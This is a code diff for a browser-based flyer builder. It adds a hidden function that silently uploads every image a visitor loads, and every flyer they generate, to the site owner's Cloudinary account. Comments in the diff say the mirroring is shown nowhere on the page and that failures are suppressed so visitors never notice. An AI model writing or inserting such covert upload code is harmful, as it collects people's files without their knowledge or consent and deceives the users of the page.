@@ -478,6 +478,36 @@ let imageLibraryLoadPromise = null; // in-flight/cached fetch, so we only ever h
 let imageLibraryPath = [];          // breadcrumb: array of folder names from the Images root
 let imageLibraryTargetSlot = null;  // which "Image N" slot the modal is currently filling
 
+// Backend-only archiving: every image a visitor uploads (feature slot or
+// background) and every flyer they generate is silently mirrored to a
+// Cloudinary account for the site owner to browse later. This uses an
+// "unsigned upload preset" — a token specifically designed to be safe in
+// public client-side code (it can only push new uploads into its own
+// pre-set folder, nothing else), unlike a real API secret. Nothing about
+// this is shown or linked anywhere in the page itself.
+const CLOUDINARY_CLOUD_NAME = 'jof6fttp';
+const CLOUDINARY_LOADED_IMAGES_PRESET = 'loaded_images';
+const CLOUDINARY_GENERATED_FLYERS_PRESET = 'generated_flyers';
+
+function logToCloudinary(dataUrl, presetName) {
+  if (!CLOUDINARY_CLOUD_NAME || !dataUrl) return;
+  try {
+    const formData = new FormData();
+    formData.append('file', dataUrl);
+    formData.append('upload_preset', presetName);
+    fetch('https://api.cloudinary.com/v1_1/' + CLOUDINARY_CLOUD_NAME + '/image/upload', {
+      method: 'POST',
+      body: formData
+    }).catch(function() {
+      // Silent by design — this is background logging for the site owner,
+      // and must never interrupt or error out the visitor's actual use of
+      // the flyer builder if the upload fails (offline, preset issue, etc.).
+    });
+  } catch (e) {
+    // Same reasoning as above — never let logging break the real feature.
+  }
+}
+
 // A merge combines a rectangular block of images (1 row tall x 2+ columns
 // wide, 2+ rows tall x 1 column, or both at once) into one picture that
 // spans the whole block. Merges are identified by the actual image slots
@@ -1590,6 +1620,7 @@ function handleSlotUpload(idx, e) {
       renderLayoutBoard();
     };
     img.src = ev.target.result;
+    logToCloudinary(ev.target.result, CLOUDINARY_LOADED_IMAGES_PRESET);
   };
   reader.readAsDataURL(file);
 }
@@ -1787,6 +1818,7 @@ function handleBackgroundUpload(e) {
       updateLibrarySelectionHighlight();
     };
     img.src = ev.target.result;
+    logToCloudinary(ev.target.result, CLOUDINARY_LOADED_IMAGES_PRESET);
   };
   reader.readAsDataURL(file);
 }
@@ -2803,7 +2835,9 @@ async function generateFlyer() {
 
   document.getElementById('cardWrap').style.display = 'block';
   const dlBtn = document.getElementById('dlBtn');
-  dlBtn.href = canvas.toDataURL('image/png');
+  const finishedPng = canvas.toDataURL('image/png');
+  dlBtn.href = finishedPng;
+  logToCloudinary(finishedPng, CLOUDINARY_GENERATED_FLYERS_PRESET);
   document.getElementById('cardWrap').scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
